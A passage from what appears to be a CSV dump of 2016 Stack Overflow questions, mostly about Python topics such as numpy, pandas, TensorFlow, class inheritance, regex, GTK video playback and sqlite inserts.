    def __init__(self):
        self.data=""1234""
</code></pre>

<p>So I have the beginning class here, which is imported from elsewhere, and let's say that the class is a universal one so I can't modify the original at all.</p>

<p>In the original, the instance is referred to as ""<code>self</code>"" inside the class, and it is defined as self inside the definition <code>__init__</code>.</p>

<pre><code>class New_Object(Object):
    # Code changing self.data here
</code></pre>

<p>So if I wanted to inherit from the class <code>Object</code>, but define self.data inside <code>New_Object</code>, I thought I would have to define <code>__init__</code> in <code>New_Object</code>, but this overrides the <code>__init__</code> from <code>New_Object</code></p>

<p>Is there any way I could do this without copypasting the <code>__init__</code> from <code>Object</code>?</p>
"
40084895,6317366.0,2016-10-17 11:10:48+00:00,2,How do I properly plot data extracted from a scope as .csv file,"<p>I just extracted a .csv file from a scope, which shows how a signal changes in the time duration of 6 seconds. Problem is that I can't come up with a proper way of plotting this signal, without things getting mushed together.</p>

<p>Mushed together like this:</p>

<p><a href=""https://i.stack.imgur.com/XYYa9.png"" rel=""nofollow""><img src=""https://i.stack.imgur.com/XYYa9.png"" alt=""Matplot screen shoot""></a></p>

<p>The .csv file is <a href=""https://ufile.io/12a6"" rel=""nofollow"">here</a>.</p>

<p>The signal goes through four stages, which I want to show with the plot, without it being to mushed together? How do I plot it?</p>

<p>More info about the signal:</p>

<p>The signal is a PWM signal that changes frequency. Either plotting the PWM signal vs. time, or the frequency of the PWM signal vs time, would be plot representation I would be /seeking for. </p>
"
39733158,6889986.0,2016-09-27 19:49:28+00:00,2,Add a new column to a csv file in python,"<p>I am trying to add a column to a csv file that combines strings from two other columns. Whenever I try this I either get an output csv with only the new column or an output with all of the original data and not the new column. </p>

<p>This is what I have so far:</p>

<pre><code>with open(filename) as csvin:
    readfile = csv.reader(csvin, delimiter=',')
    with open(output, 'w') as csvout:
        writefile = csv.writer(csvout, delimiter=',', lineterminator='\n')
        for row in readfile:
            result = [str(row[10]) + ' ' + str(row[11])]
            writefile.writerow(result)
</code></pre>

<p>Any help would be appreciated.</p>
"
39732957,6889186.0,2016-09-27 19:36:24+00:00,2,Numpy array manipulation within range of columns and rows,"<p>I have a numpy boolean 2D array that represents a grayscale image which is essentially an unfilled shape (triangle, square, circle) consisting of <code>True</code> for white pixels, and <code>False</code> for black pixels. I would like to add a black fill by modifying the white pixels to black pixels.</p>

<pre><code>array([[True, True, True, False, False, False, False, False, True, True, True],
       [True, True, True, False,  True,  True,  True, False, True, True, True],
       [True, True, True, False,  True,  True,  True, False, True, True, True],
       [True, True, True, False,  True,  True,  True, False, True, True, True],
       [True, True, True, False, False, False, False, False, True, True, True]])
</code></pre>

<p>(The 9 <code>True</code> values in a square in the middle of this array should become <code>False</code>.)</p>

<p>Is there a numpy slice method that will make this easy/fast? Something that I can modify all <code>True</code>s anytime there's a <code>False</code> followed by a <code>True</code> until the next instance of a <code>False</code>?</p>
"
39665702,3340234.0,2016-09-23 16:41:11+00:00,2,Tensorflow: value error with variable_scope,"<p>This is my code below:</p>

<pre><code>'''
Tensorflow LSTM classification of 16x30 images.
'''

from __future__ import print_function

import tensorflow as tf
from tensorflow.python.ops import rnn, rnn_cell
import numpy as np
from numpy import genfromtxt
from sklearn.cross_validation import train_test_split
import pandas as pd

'''
a Tensorflow LSTM that will sequentially input several lines from each single image 
i.e. The Tensorflow graph will take a flat (1,480) features image as it was done in Multi-layer
perceptron MNIST Tensorflow tutorial, but then reshape it in a sequential manner with 16 features each and 30 time_steps.
'''

blaine = genfromtxt('./Desktop/Blaine_CSV_lstm.csv',delimiter=',')  # CSV transform to array
target = [row[0] for row in blaine]             # 1st column in CSV as the targets
data = blaine[:, 1:481]                          #flat feature vectors
X_train, X_test, y_train, y_test = train_test_split(data, target, test_size=0.05, random_state=42)

f=open('cs-training.csv','w')       #1st split for training
for i,j in enumerate(X_train):
        k=np.append(np.array(y_train[i]),j   )
        f.write("","".join([str(s) for s in k]) + '\n')
f.close()
f=open('cs-testing.csv','w')        #2nd split for test
for i,j in enumerate(X_test):
        k=np.append(np.array(y_test[i]),j   )
        f.write("","".join([str(s) for s in k]) + '\n')
f.close()



new_data = genfromtxt('cs-training.csv',delimiter=',')  # Training data
new_test_data = genfromtxt('cs-testing.csv',delimiter=',')  # Test data

x_train=np.array([ i[1::] for i in new_data])
ss = pd.Series(y_train)     #indexing series needed for later Pandas Dummies one-hot vectors
y_train_onehot = pd.get_dummies(ss)

x_test=np.array([ i[1::] for i in new_test_data])
gg = pd.Series(y_test)
y_test_onehot = pd.get_dummies(gg)


# General Parameters
learning_rate = 0.001
training_iters = 100000
batch_size = 33
display_step = 10

# Tensorflow LSTM Network Parameters
n_input = 16 # MNIST data input (img shape: 28*28)
n_steps = 30 # timesteps
n_hidden = 128 # hidden layer num of features
n_classes = 20 # MNIST total classes (0-9 digits)

# tf Graph input
x = tf.placeholder(""float"", [None, n_steps, n_input])
y = tf.placeholder(""float"", [None, n_classes])

# Define weights

weights = {
    'out': tf.Variable(tf.random_normal([n_hidden, n_classes]))
}
biases = {
    'out': tf.Variable(tf.random_normal([n_classes]))
}


def RNN(x, weights, biases):

    # Prepare data shape to match `rnn` function requirements
    # Current data input shape: (batch_size, n_steps, n_input)
    # Required shape: 'n_steps' tensors list of shape (batch_size, n_input)

    # Permuting batch_size and n_steps
    x = tf.transpose(x, [1, 0, 2])
    # Reshaping to (n_steps*batch_size, n_input)
    x = tf.reshape(x, [-1, n_input])
    # Split to get a list of 'n_steps' tensors of shape (batch_size, n_input)
    x = tf.split(0, n_steps, x)

    # Define a lstm cell with tensorflow
    with tf.variable_scope('cell_def'): 
        lstm_cell = tf.nn.rnn_cell.LSTMCell(n_hidden, forget_bias=1.0)

    # Get lstm cell output
    with tf.variable_scope('rnn_def'): 
        outputs, states = tf.nn.rnn(lstm_cell, x, dtype=tf.float32)

    # Linear activation, using rnn inner loop last output
    return tf.matmul(outputs[-1], weights['out']) + biases['out']

pred = RNN(x, weights, biases)

# Define loss and optimizer
cost = tf.reduce_mean(tf.nn.softmax_cross_entropy_with_logits(pred, y))
optimizer = tf.train.AdamOptimizer(learning_rate=learning_rate).minimize(cost)

# Evaluate model
correct_pred = tf.equal(tf.argmax(pred,1), tf.argmax(y,1))
accuracy = tf.reduce_mean(tf.cast(correct_pred, tf.float32))

# Initializing the variables
init = tf.initialize_all_variables()

# Launch the graph
with tf.Session() as sess:
    sess.run(init)
    step = 1
    # Keep training until reach max iterations
    while step * batch_size &lt; training_iters:
        batch_x = np.split(x_train, 15)
        batch_y = np.split(y_train_onehot, 15)
        for index in range(len(batch_x)):
            ouh1 = batch_x[index]
            ouh2 = batch_y[index]
            # Reshape data to get 28 seq of 28 elements
            ouh1 = np.reshape(ouh1,(batch_size, n_steps, n_input))        
            sess.run(optimizer, feed_dict={x: ouh1, y: ouh2})      # Run optimization op (backprop)
            if step % display_step == 0:
                # Calculate batch accuracy
                acc = sess.run(accuracy, feed_dict={x: ouh1, y: ouh2})
                # Calculate batch loss
                loss = sess.run(cost, feed_dict={x: ouh1, y: ouh2})
                print(""Iter "" + str(step*batch_size) + "", Minibatch Loss= "" + \
                    ""{:.6f}"".format(loss) + "", Training Accuracy= "" + \
                    ""{:.5f}"".format(acc))
                step += 1
print(""Optimization Finished!"")
</code></pre>

<p>and I am getting the below error that it seems i am re-iterating over the same variable on lines 92 and 97, and i am concerned that it might be a case of incompatibility with Tensorflow 0.10.0 on the RNN def side:</p>

<pre><code>ValueError: Variable RNN/BasicLSTMCell/Linear/Matrix already exists, disallowed. Did you mean to set reuse=True in VarScope? Originally defined at:

  File ""/home/mohsen/lstm_mnist.py"", line 92, in RNN
    outputs, states = tf.nn.rnn(lstm_cell, x, dtype=tf.float32)
  File ""/home/mohsen/lstm_mnist.py"", line 97, in &lt;module&gt;
    pred = RNN(x, weights, biases)
  File ""/home/mohsen/anaconda2/lib/python2.7/site-packages/spyderlib/widgets/externalshell/sitecustomize.py"", line 81, in execfile
    builtins.execfile(filename, *where)
</code></pre>

<p>What could be the origin of this error and how i can resolve it?</p>

<p>EDIT: from the original repo where i build upon my code the same variable_scope problem persists <a href=""https://github.com/aymericdamien/TensorFlow-Examples/blob/master/examples/3_NeuralNetworks/recurrent_network.py"" rel=""nofollow"">https://github.com/aymericdamien/TensorFlow-Examples/blob/master/examples/3_NeuralNetworks/recurrent_network.py</a></p>
"
39666136,2687490.0,2016-09-23 17:08:51+00:00,2,Logical operations with array of strings in Python,"<p>I know the following logical operation works with numpy: </p>

<pre><code>A = np.array([True, False, True])
B = np.array([1.0, 2.0, 3.0])
C = A*B = array([1.0, 0.0, 3.0])
</code></pre>

<p>But the same isn't true if B is an array of strings. Is it possible to do the following:   </p>

<pre><code>A = np.array([True, False, True])
B = np.array(['eggs', 'milk', 'cheese'])
C = A*B = array(['eggs', '', 'cheese'])
</code></pre>

<p>That is a string multiplied with False should equal an empty string. Can this be done without a loop in Python (doesn't have to use numpy)?</p>

<p>Thanks!</p>
"
39666890,1638998.0,2016-09-23 17:58:57+00:00,2,Extracting a row from a table from a url,"<p>I want to download EPS value for all years (Under Annual Trends) from the below link.
<a href=""http://www.bseindia.com/stock-share-price/stockreach_financials.aspx?scripcode=500180&amp;expandable=0"" rel=""nofollow"">http://www.bseindia.com/stock-share-price/stockreach_financials.aspx?scripcode=500180&amp;expandable=0</a></p>

<p>I tried using Beautiful Soup as mentioned in the below answer.
<a href=""http://stackoverflow.com/questions/17196018/extracting-table-contents-from-html-with-python-and-beautifulsoup"">Extracting table contents from html with python and BeautifulSoup</a>
But couldn't proceed after the below code. I feel I am very close to my answer. Any help will be greatly appreciated.</p>

<pre><code>from bs4 import BeautifulSoup
import urllib2
html = urllib2.urlopen(""http://www.bseindia.com/stock-share-price/stockreach_financials.aspx?scripcode=500180&amp;expandable=0"").read()
soup=BeautifulSoup(html)
table = soup.find('table',{'id' :'acr'})
#the below code wasn't working as I expected it to be
tr = table.find('tr', text='EPS')
</code></pre>

<p>I am open to using any other language to get this done</p>
"
40081237,6632212.0,2016-10-17 08:01:13+00:00,2,How to create 2 gram shingles?,"<p>I have this code which i got from some tutorial-:</p>

<pre><code>list1 = [['hello','there','you','too'],['hello','there','you','too','there'],['there','you','hello']]

def get_shingle(size,f):
    #shingles = set()
    for i in range (0,len(f)-2+1):
        yield f[i:i+2]

#shingles1 = set(get_shingle(list1[0],2))
#shingles2 = set(get_shingle(list1[1],2))
shingles1 = set(get_shingle(2,list1[0]))
shingles2 = set(get_shingle(2,list1[1]))

print shingles1
print shingles2
print ""done""
</code></pre>

<p>When i try to run this code i am getting an error -: </p>

<pre><code>Traceback (most recent call last):
  File ""E:\Research\Shingle Method\create_shingle.py"", line 10, in &lt;module&gt;
    shingles1 = set(get_shingle(2,list1[0]))
TypeError: unhashable type: 'list'
</code></pre>

<p>If list1 is set then the error does not come. But i cannot convert list1 into set as <strong>it removes duplicate words</strong> and also i need it to be a list for my major code which processes a huge text file in the form of list. 
Why am i getting this 'unhashable list'? Can't we pass list as argument?</p>
"
40080783,5452365.0,2016-10-17 07:34:11+00:00,2,Understanding Inheritance in python,"<p>I am learning OOP in python.</p>

<p>I am struggling why this is not working as I intended?</p>

<pre><code>class Patent(object):
    """"""An object to hold patent information in Specific format""""""
    def __init__(self, CC, PN, KC=""""):
        self.cc = CC
        self.pn = PN
        self.kc = KC

class USPatent(Patent):
    """"""""Class for holding information of uspto patents in Specific format""""""
    def __init__(self, CC, PN, KC=""""):
        Patent.__init__(self, CC, PN, KC="""")


pt1 = Patent(""US"", ""20160243185"", ""A1"")

pt2 = USPatent(""US"", ""20160243185"", ""A1"")

pt1.kc
Out[168]: 'A1'

pt2.kc
Out[169]: ''
</code></pre>

<p>What obvious mistake I am making so that I am not able to get kc in USPatent instance?</p>
"
39669147,4238076.0,2016-09-23 20:37:36+00:00,2,If there difference between `\A` vs `^` (caret) in regular expression?,"<p>Python's <a href=""https://docs.python.org/2/library/re.html"" rel=""nofollow""><code>re</code> module documentation</a> says:</p>

<blockquote>
  <p><code>^</code>: (Caret.) Matches the start of the string, and in MULTILINE mode also matches immediately after each newline.</p>
  
  <p><code>\A</code>: Matches only at the start of the string.</p>
</blockquote>

<p>Is there any difference when using them?</p>
"
39731477,6201333.0,2016-09-27 18:04:27+00:00,2,Math operations on multi-dimensional Python dicts,"<p>I am porting over some code from PHP that iterates through some database results and builds a two-dimensional array of wins and losses for teams in a baseball league. Here's the code in question in PHP</p>

<pre><code>    foreach ($results as $result) {
        $home_team = $result['Game']['home_team_id'];
        $away_team = $result['Game']['away_team_id'];

        if (!isset($wins[$home_team][$away_team])) $wins[$home_team][$away_team] = 0;
        if (!isset($wins[$away_team][$home_team])) $wins[$away_team][$home_team] = 0;
        if (!isset($losses[$home_team][$away_team])) $losses[$home_team][$away_team] = 0;
        if (!isset($losses[$away_team][$home_team])) $losses[$away_team][$home_team] = 0;

        if ($result['Game']['home_score'] &gt; $result['Game']['away_score']) {
            $wins[$home_team][$away_team]++;
            $losses[$away_team][$home_team]++;
        } else {
            $wins[$away_team][$home_team]++;
            $losses[$home_team][$away_team]++;
        }
    }
</code></pre>

<p><code>$results</code> is an array that contains the results of a database query</p>

<p>(Edited to add the Python code I have in-profess)</p>

<p>Now I have this but in Python. <code>results</code> contains a collection of Sqlalchemy result objects</p>

<pre><code>from sqlalchemy import Column, create_engine, ForeignKey, Integer, String
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy.orm import sessionmaker


Base = declarative_base()
engine = create_engine('postgresql://stats:st@ts=Fun@localhost/ibl_stats')
Session = sessionmaker()
Session.configure(bind=engine)
session = Session()


class Game(Base):
    __tablename__ = 'games'

    id = Column(Integer, primary_key=True)
    week = Column(Integer)
    home_score = Column(Integer)
    away_score = Column(Integer)
    home_team_id = Column(Integer, ForeignKey('franchises.id'))
    away_team_id = Column(Integer, ForeignKey('franchises.id'))


class Franchise(Base):
    __tablename__ = 'franchises'

    id = Column(Integer, primary_key=True)
    nickname = Column(String(3))
    name = Column(String(50))
    conference = Column(String(10))
    division = Column(String(10))
    ip = Column(Integer)

# Loop through our standings building up the breakdown results
results = session.query(Game).all()
wins = dict()
losses = dict()

for result in results:
    home_team = result.home_team_id
    away_team = result.away_team_id

    if result.home_score &gt; result.away_score:
        wins[home_team][away_team] += 1
        losses[away_team][home_team] += 1
    else:
        wins[away_team][home_team] += 1
        losses[home_team][away_team] += 1
</code></pre>

<p>So when I run this code I get the following error:</p>

<pre><code>(venv)vagrant@ibl:/vagrant/scripts$ python playoff_odds.py
Traceback (most recent call last):
  File ""playoff_odds.py"", line 45, in &lt;module&gt;
    wins[home_team][away_team] += 1
KeyError: 1
</code></pre>

<p>I did some searching before and it starts getting into the concept of ""autovivification"", which is something PHP does by default but Python does not.</p>

<p>So how do I duplicate the same behaviour in the Python code?</p>
"
39731396,5209231.0,2016-09-27 17:59:57+00:00,2,python pandas summarizing nominal variables (counting),"<p>I have following data frame:</p>

<pre class=""lang-none prettyprint-override""><code>KEY PROD PARAMETER Y/N
1    AAA    PARAM1   Y
1    AAA    PARAM2   N
1    AAA    PARAM3   N
2    AAA    PARAM1   N
2    AAA    PARAM2   Y
2    AAA    PARAM3   Y
3    CCC    PARAM1   Y
3    CCC    PARAM2   Y
3    CCC    PARAM3   Y
</code></pre>

<p>I am interested in summarizing Y/N column values by PROD and PARAMETER columns and get the following output:</p>

<pre class=""lang-none prettyprint-override""><code>PROD  PARAM Y N
 AAA PARAM1 1 1
 AAA PARAM2 1 1
 AAA PARAM3 1 1
 CCC PARAM1 1 0
 CCC PARAM2 1 0
 CCC PARAM3 1 0
</code></pre>

<p>While Y and N values are counts of Y/N column values from the original data frame.</p>
"
39667572,6126242.0,2016-09-23 18:42:19+00:00,2,Why does the result variable update itself?,"<p>I have the following code:</p>

<p><code>result = datetime.datetime.now() - datetime.timedelta(seconds=60)</code></p>

<pre><code>&gt;&gt;&gt; result.utcnow().isoformat()
'2016-09-23T18:39:34.174406'
&gt;&gt;&gt; result.utcnow().isoformat()
'2016-09-23T18:40:18.240571'
</code></pre>

<p>Somehow the variable is being updated... and I have no clue as to how or how to stop it. What is this called? How do I prevent it?</p>

<p>Thank you!</p>
"
40039516,1145666.0,2016-10-14 09:21:29+00:00,2,string.format() stops working correctly in my script,"<p>I have this format string:</p>

<pre><code>print ""{u: &lt;16}  {l: &gt;16}  {lse: &lt;19}  {active: &lt;12}"".format(...)
</code></pre>

<p>which works fine in the Python console, but when run in my program, it prints <code>&lt;19</code> (literally) for the <code>lse</code> part. When I remove the <code>&lt;19</code> in the format specifier for <code>lse</code>, it does work...</p>

<p>My data is fine, because when just using plain <code>{u}</code>, etc, the correct data is printed.</p>

<p><strong>Update</strong> the field is a <code>datetime</code> field. How can I print a <code>datetime</code> field using the format specifiers?</p>
"
40039531,3679490.0,2016-10-14 09:22:13+00:00,2,Pandas Delete rows from dataframe based on condition,"<p>Consider this code:</p>

<pre><code>from StringIO import StringIO
import pandas as pd

txt = """"""a, RR
10, 1asas
20, 1asasas
30,
40, asas
50, ayty
60, 2asas
80, 3asas""""""
frame = pd.read_csv(StringIO(txt), skipinitialspace=True)

print frame,""\n\n\n""

l=[]
for i,j in frame[~ frame['RR'].str.startswith(""1"", na=True)]['RR'].iteritems():
    if j.startswith(('2','3')):
         if frame[frame['RR'].str.startswith(""1"", na=False)]['RR'].str.match(""1""+j[1:], as_indexer = True).any():
            l.append(i)
    else:
        if frame[frame['RR'].str.startswith(""1"", na=False)]['RR'].str.match(""1""+j, as_indexer = True).any():
            l.append(i)
 frame = frame.drop(frame.index[l])
 print frame
</code></pre>

<p>What i am doing here is,</p>

<p>1)Loop through dataframes to drop any <code>RR</code> which already has <code>1RR</code> in dataframe</p>

<p>2)If <code>RR</code> has <code>2 or 3</code> at start , then drop if that <code>RR</code> has <code>1RR[1:]</code> in dataframe.</p>

<p>3)If <code>RR</code> startswith <code>1</code> or is <code>NaN</code> do not touch it.</p>

<p>The code is working fine but this <code>dataframe</code> will have upto 1 million entries and i dont think this code is optimsed.As i have just started with <code>pandas</code> i have limited knowledge.
Is there any way we can achieve this without <code>iteration</code>.Does <code>pandas</code> has any inbuilt utility to do this?</p>
"
39730787,6083655.0,2016-09-27 17:22:39+00:00,2,Paypal Transactions: How to receive and send funds with PayPal API and Django?,"<p>i've been wondering to make payment system for my Django website, but with PayPal it seems to be easier for users, i've heard there is special API for python, so it can be used with Django.</p>

<hr>

<p>So for example, There is user account and my account, i make a receiver function, which listens to the payment gateway and whenever user sends funds to the email, it does a specific commands. Now i also make a sender function, so i can send funds to users, Now if API get's users email whenever they see HTTP Response of Paypal paying window, i want to make a function to send it to specific email.</p>

<p>Also another example with code:</p>

<pre><code>import random
from process import multiprocessing
Users = [ ""..."" ]
# PayPal:
import SomePayPalApi

def Receiver():
    SomePayPalApi.receive_to = SomePayPalApi.current_user.email
    while True:
        if SomePayPalApi.recieved:
            print SomePaypalApi.recieved.amount
            print SomePaypalApi.received.email
            print SomePaypalApi.Balance
            received = True              
            break

def Sender():
    SomePayPalApi.sendto = random.choice(Users)
    SomePayPalApi.send()


if __name__ == ""__main__"":
    p1 = Process(target=Receiver)
    p2 = Process(target=Sender)
    p1.start()
    p2.start()
</code></pre>

<p>I know it's not as easy as example, but i am looking for two general functions of PayPal, Paying and Receiving, How can i achieve this API on Django? Also if possible, How can i see amount of money received on my account and balance of my account? Can i use PayPal Api documentation for Django?
How can paying back be done in Django-Paypal Library?</p>
"
40080263,3548063.0,2016-10-17 07:01:50+00:00,2,Find combinations with arrays and a combination pattern,"<p>I have arrays such as these, and each pattern designates a combination shape with each number representing the size of the combination.</p>

<ul>
<li>pattern 0: <code>[1, 1, 1, 1]</code></li>
<li>pattern 1: <code>[2, 1, 1]</code></li>
<li>pattern 2: <code>[3, 1]</code></li>
<li>pattern 3: <code>[4]</code></li>
<li>...</li>
</ul>

<p>I also have a char-valued list like below. len(chars) equals the sum of the upper array's value.</p>

<p><code>chars = ['A', 'B', 'C', 'D']</code></p>

<p>I want to find all combinations of chars following a given pattern. For example, for pattern 1, 4C2 * 2C1 * 1C1 is the number of combinations.</p>

<pre><code>[['A', 'B'], ['C'], ['D']]
[['A', 'B'], ['D'], ['C']]
[['A', 'C'], ['B'], ['D']]
[['A', 'C'], ['D'], ['B']]
[['A', 'D'], ['B'], ['C']]
[['A', 'D'], ['C'], ['B']]
...
</code></pre>

<p>But I don't know how to create such combination arrays. Of course I know there are a lot of useful functions for combinations in python. But I don't know how to use them to create a combination array of combinations.</p>

<p><strong>EDITED</strong></p>

<p>I'm so sorry my explanation is confusing. I show a simple example.</p>

<ul>
<li>pattern 0: <code>[1, 1]</code></li>
<li>pattern 1: <code>[2]</code></li>
<li><code>chars = ['A', 'B']</code></li>
</ul>

<p>Then, the result should be like below. So first dimension should be permutation, but second dimension should be combination.</p>

<ul>
<li>pat0: <code>[['A'], ['B']]</code></li>
<li>pat0: <code>[['B'], ['A']]</code></li>
<li>pat1: <code>[['A', 'B']]  # NOTE: [['B', 'A']] is same in my problem</code></li>
</ul>
"
39730737,2821224.0,2016-09-27 17:18:55+00:00,2,Panda group dataframe based on datetime type into different period ignoring date part,"<p>I want to group the rows into groups, based on variable time interval.
However, when doing grouping, I want to ignore the date part, only group based on the time date. </p>

<p>Say I want to group every 5 minutes.</p>

<pre><code>       timestampe            val
0  2016-08-11 11:03:00        0.1
1  2016-08-13 11:06:00        0.3
2  2016-08-09 11:04:00        0.5
3  2016-08-05 11:35:00        0.7
4  2016-08-19 11:09:00        0.8
5  2016-08-21 12:37:00        0.9

        into 

       timestampe             val
0  2016-08-11 11:03:00        0.1
2  2016-08-09 11:04:00        0.5

       timestampe             val
1  2016-08-13 11:06:00        0.3
4  2016-08-19 11:09:00        0.8

       timestampe             val
3  2016-08-05 11:35:00        0.7
       timestampe             val
5  2016-08-21 12:37:00        0.9
</code></pre>

<p>Notice as long as the time is within the same 5 minutes interval, the rows are grouped, regardless of the date.</p>
"
40078718,1813277.0,2016-10-17 04:56:23+00:00,2,Playing video in Gtk in a window with a menubar,"<p>I have created a video player in Gtk3 using Gstreamer in Python3. It works except when I add a GtkMenuBar (place 2). It will then either show a black screen, or fail with an exception. The exception references the <code>XInitThreads</code>, which I am calling (Place 1) (I took this from the pitivi project) but this does not seem to make a diffrence.</p>

<p>Question: How do I make this work?</p>

<p>Other things I would like to know: </p>

<ol>
<li>Why would the menubar break this?</li>
<li>This will clearly break on anything not X, is there some prebuilt component the abstracts this logic and is crossplatform that I am missing?</li>
</ol>

<p>System:</p>

<ul>
<li>python3</li>
<li>Gtk3</li>
<li>Ubuntu 16.04</li>
</ul>

<p>The exception:</p>

<pre><code>[xcb] Unknown request in queue while dequeuing
[xcb] Most likely this is a multi-threaded client and XInitThreads has not been called
[xcb] Aborting, sorry about that.
python3: ../../src/xcb_io.c:179: dequeue_pending_request: Assertion `!xcb_xlib_unknown_req_in_deq' failed.
</code></pre>

<p>The code (in as small a form as possible to demonstrate the concept):  </p>

<pre><code>import gi
gi.require_version('Gtk', '3.0')
gi.require_version('Gst', '1.0')
gi.require_version('GstVideo', '1.0')

from gi.repository import Gtk, xlib
from gi.repository import Gst, Gdk, GdkX11, GstVideo
Gst.init(None)
Gst.init_check(None)

# Place 1
from ctypes import cdll
x11 = cdll.LoadLibrary('libX11.so')
x11.XInitThreads()

# [xcb] Unknown request in queue while dequeuing
# [xcb] Most likely this is a multi-threaded client and XInitThreads has not been called
# [xcb] Aborting, sorry about that.
# python3: ../../src/xcb_io.c:179: dequeue_pending_request: Assertion `!xcb_xlib_unknown_req_in_deq' failed.

# (foo.py:31933): Gdk-WARNING **: foo.py: Fatal IO error 11 (Resource temporarily unavailable) on X server :1.

class PipelineManager(object):
    def __init__(self, window, pipeline):
        self.window = window
        if isinstance(pipeline, str):
            pipeline = Gst.parse_launch(pipeline)

        self.pipeline = pipeline

        bus = pipeline.get_bus()
        bus.set_sync_handler(self.bus_callback)
        pipeline.set_state(Gst.State.PLAYING)

    def bus_callback(self, bus, message):
        if message.type is Gst.MessageType.ELEMENT:
            if GstVideo.is_video_overlay_prepare_window_handle_message(message):
                Gdk.threads_enter()
                Gdk.Display.get_default().sync()
                win = self.window.get_property('window')

                if isinstance(win, GdkX11.X11Window):
                    message.src.set_window_handle(win.get_xid())
                else:
                    print('Nope')

                Gdk.threads_leave()
        return Gst.BusSyncReply.PASS


pipeline = Gst.parse_launch('videotestsrc ! xvimagesink sync=false')

window = Gtk.ApplicationWindow()

header_bar = Gtk.HeaderBar()
header_bar.set_show_close_button(True)
# window.set_titlebar(header_bar)  # Place 2

drawing_area = Gtk.DrawingArea()
drawing_area.connect('realize', lambda widget: PipelineManager(widget, pipeline))
window.add(drawing_area)

window.show_all()

def on_destroy(win):
    try:
        Gtk.main_quit()
    except KeyboardInterrupt:
        pass

window.connect('destroy', on_destroy)

Gtk.main()
</code></pre>
"
39726737,5380136.0,2016-09-27 14:00:15+00:00,2,How can I travel through the words of a file in PYTHON?,"<p>I have a file .txt and I want to travel through the words of it. I have a problem, I need to remove the punctuation marks before travelling through the words. I have tried this, but it isn't removing the punctuation marks.</p>

<pre><code>file=open(file_name,""r"")
for word in file.read().strip("",;.:- '"").split():
     print word
file.close()
</code></pre>
"
40077180,6942962.0,2016-10-17 01:03:53+00:00,2,File Access in python,"<p>Whenever I go to load a text file for my program it displays the info in the text file yet when I input the roster function it does not display the text file and show it is available to be modified. Is it something with how I created the text file in the first place or is my coding for <code>loadData</code> not written correctly i think i may be confused on the difference between just setting up a function just to read back the file instead of actually opening the text file to be able to modify it.</p>

<pre><code>dict_member = {}
players = dict_member
class Players:
    def __init__(self, name, number, jersey):
        self.name = name
        self.number = number
        self.jersey = jersey
    def display(self):
        print('Printing current members\n')
        for number, player in dict_member.items():
            print(player.name + ', ' + player.number + ', ' + player.jersey)
    def add(self):
        nam = input(""Enter Player Name\n "")
        numb = input(""Enter Player Number\n "")
        jers = input(""Enter Jersey Number\n "")
        dict_member[nam] = Players(nam, numb, jers)
    def remove(self, name):
        if name in dict_member:
            del dict_member[name]
    def edit(self, name):
        if name in dict_member:
            nam = input(""Enter Different Name\n"")
            num = input(""Enter New Number\n "")
            jers = input(""Enter New Jersey Number\n "")
            del dict_member[name]
            dict_member[name] = Players(nam, num, jers)
        else:
            print(""No such player exists"")

    def saveData(self):
        roster = input(""Filename to save: "")
        print(""Saving data..."")
        with open(roster, ""r+"") as rstr:
            for number, player in dict_member.items():
                rstr.write(player.name + ', ' + player.number + ', ' + player.jersey)
            print(""Data saved."")
            rstr.close()

    def loadData(self):
        dict_member = {}
        roster = input(""Filename to load: "")
        file = open(roster, ""r"")
        while True:
            inLine = file.readline()
            if not inLine:
                'break'
            inLine = inLine[:-1]
            name, number, jersey = inLine.split("","")
            dict_member[name] = (name, number, jersey)
        print(""Data Loaded Successfully."")
        file.close()
        return dict_member

def display_menu():
    print("""")
    print(""1. Roster "")
    print(""2. Add"")
    print(""3. Remove "")
    print(""4. Edit "")
    print(""5. Save"")
    print(""6. Load"")
    print(""9. Exit "")
    print("""")
    return int(input(""Selection&gt; ""))
print(""Welcome to the Team Manager"")
player_instance = Players(None, None, None)
menu_item = display_menu()
while menu_item != 9:
    if menu_item == 1:
        player_instance.display()
    elif menu_item == 2:
        player_instance.add()
    elif menu_item == 3:
        m = input(""Enter Player to Remove\n"")
        player_instance.remove(m)
    elif menu_item == 4:
        m = input(""Enter Player to Edit\n"")
        player_instance.edit(m)
    elif menu_item == 5:
        player_instance.saveData()
    elif menu_item == 6:
        player_instance.loadData()
    menu_item = display_menu()
print(""Exiting Program..."")
</code></pre>
"
40074032,4863796.0,2016-10-16 18:39:34+00:00,2,How to un-elevate permissions in windows with python,"<p>I'm trying to run commands as a particular user rather than an administrator.... seems strange, but roll with me here. </p>

<p>I am running my python script as an administrator, but would like to perform certain functions of the script as an underprivileged user.</p>

<p>For example, something like this would be what I would want to accomplish</p>

<pre><code>from shutil import copyfile

as_user('testuser', 'P@$$w0rd1', copyfile(src, dst))
</code></pre>

<p>Other parts of the script would proceed to run as administrator. I've tried using run-as and psexec without any luck as the just end up popping open a new window entirely :|</p>

<p>Other than this, I have no idea how to accomplish this task on windows, with linux this sort of stuff is easy.</p>
"
39670940,3599135.0,2016-09-23 23:30:49+00:00,2,Installation of OpenCV in Ubuntu 14.04,"<p>I built OpenCV from Source but I can't manage to use it. Every time I try to even load an image with the next code I get <code>No module named cv2.cv</code>. Why is that happening? How can I fix it?</p>

<pre><code>from cv2.cv import *

img = LoadImage(""/home/User/Desktop/Image.png"")
NamedWindow(""opencv"")
ShowImage(""opencv"",img)
WaitKey(0)
</code></pre>

<p>The procedure I did was the following...</p>

<p>I downloaded the zip file from the main page of GitHub and while being in a destination directory I created, I built OpenCV using</p>

<p><code>cmake OpenCV_Source_Directory</code></p>

<p>Then on the destination directory I run</p>

<p><code>make</code></p>

<p><code>sudo make install</code></p>
"
40047742,7020209.0,2016-10-14 16:16:27+00:00,2,Sqlite3 INSERT query ERROR?,"<p>i want to insert in my DB 2 strings var </p>

<p>one entered from the user ==> H and </p>

<p>one generated form the chatbot==> B</p>

<p>Here is the code:</p>

<pre><code># initialize the connection to the database
sqlite_file = '/Users/emansaad/Desktop/chatbot1/brain.sqlite'
connection = sqlite3.connect(sqlite_file)
connection.create_function(""REGEXP"", 2, regexp)
cursor = connection.cursor()
connection.text_factory = str
connection = open

def new_data(Input,Output):
     row = cursor.execute('SELECT * FROM chatting_log WHERE user=?',(Input,)).fetchone()
     if row:
        return
     else:
        cursor.execute('INSERT INTO chatting_log VALUES (?, ?)', (Input, Output))

while True:
   print((""B:%s"" % B))  
   H = input('H:')
   New_H= ' '.join(PreProcess_text(H))
